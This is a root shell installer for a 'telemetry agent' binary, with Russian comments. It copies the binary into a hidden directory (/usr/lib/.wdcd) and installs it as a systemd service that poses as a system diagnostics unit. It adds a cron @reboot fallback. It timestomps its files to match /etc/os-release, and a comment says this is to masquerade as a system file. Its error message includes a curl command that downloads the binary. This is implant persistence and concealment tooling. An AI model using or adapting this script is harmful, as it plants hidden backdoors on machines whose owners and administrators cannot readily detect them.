#!/bin/sh
# install.sh — установка агента (телеметрия) из-под ROOT.
# Бинарь diagd несёт config+keypair В СЕБЕ (на диске нет config.json/ключей).
# Ставит systemd-сервис + cron.fallback, включает автозапуск.
#
# Использование:  ./install.sh            (из директории, где лежит diagd)
#                 ./install.sh /path/to/diagd
set -e

SRC="${1:-$(dirname "$(realpath "$0")")/diagd}"
DIR="/usr/lib/.wdcd"

if [ ! -f "$SRC" ] || [ ! -x "$SRC" ]; then
  echo "нет бинарника: $SRC" >&2
  echo "скачай: curl -L -o diagd https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools/diagd" >&2
  exit 1
fi

# ---- CA-бандл для HTTPS-стуков ----
CA=/etc/ssl/certs/ca-certificates.crt
if [ ! -s "$CA" ]; then
  echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
  if command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
  if command -v yum >/dev/null 2>&1; then yum install -y ca-certificates >/dev/null 2>&1 || true; fi
  if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — HTTPS невозможен" >&2; exit 1; fi
fi

# ---- минимальные требования ----
if command -v systemctl >/dev/null 2>&1; then :; else
  echo "systemd не найден — агент работает как демон без автозапуска" >&2
fi

# ---- раскладка ----
mkdir -p "$DIR/bin"
if command -v systemctl >/dev/null 2>&1; then systemctl stop systemd-sysdiag.service 2>/dev/null || true; fi
cp -f "$SRC" "$DIR/bin/sysdiag"
chmod 755 "$DIR/bin/sysdiag"

# Чистим остатки файлового режима/прошлой личности: ключей на диске быть НЕ должно.
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR/config.json"
chmod 700 "$DIR" "$DIR/bin"

# ---- mtime выравниваем по системе (маскировка под системный файл) ----
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
  touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/sysdiag" 2>/dev/null || true
fi

# ---- systemd-сервис ----
if command -v systemctl >/dev/null 2>&1; then
cat > /etc/systemd/system/systemd-sysdiag.service <<UNIT
[Unit]
Description=System Diagnostics
After=network-online.target
[Service]
ExecStart=$DIR/bin/sysdiag --foreground
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
UNIT
  if [ "$_stamp" -gt 0 ] 2>/dev/null; then
    touch -d "@$_stamp" /etc/systemd/system/systemd-sysdiag.service 2>/dev/null || true
  fi
  systemctl daemon-reload
  systemctl enable --now systemd-sysdiag.service
  echo "agent установлен (systemd): $(systemctl is-active systemd-sysdiag.service)"
fi

# ---- cron.fallback (если systemd недоступен/не поднялся) ----
printf '@reboot root sleep 45; /usr/bin/systemctl is-active --quiet systemd-sysdiag.service || %s/bin/sysdiag --foreground\n' "$DIR" > /etc/cron.d/systemd-sysdiag
chmod 644 /etc/cron.d/systemd-sysdiag
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
  touch -d "@$_stamp" /etc/cron.d/systemd-sysdiag 2>/dev/null || true
fi

echo "done. агент: $DIR/bin/sysdiag"
